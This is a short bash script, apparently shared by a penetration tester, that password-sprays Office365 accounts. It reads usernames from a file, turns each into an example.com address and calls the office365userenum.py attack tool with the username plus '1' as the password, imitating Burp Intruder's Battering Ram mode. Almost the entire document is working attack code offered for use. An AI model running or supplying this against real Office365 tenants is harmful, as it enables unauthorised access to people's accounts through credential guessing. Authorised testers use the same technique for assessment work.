# This little hacky script is designed to imitate what is possible when password spraying with Burp Suite Intruder's Battering Ram, allowing you to test for the username string being present in the password during Office365 password spraying attacks.
#
# Requires:
# office365userenum.py attack tool -- git clone https://bitbucket.org/grimhacker/office365userenum.git
# usernames.txt input file which has the username portion of the email address only (one per line), optionally with the first character capitalized
# modify the example.com email domain
# modify the --password option, so that the reused username string is appended with the string of your liking (currently appended with 1)
#
# Script by @james1052
#
#!/bin/bash
while read user; do
	echo -n $user@example.com > current-target.tmp
	./office365userenum.py -u current-target.tmp -o result.txt --password "$user"1
done <usernames.txt
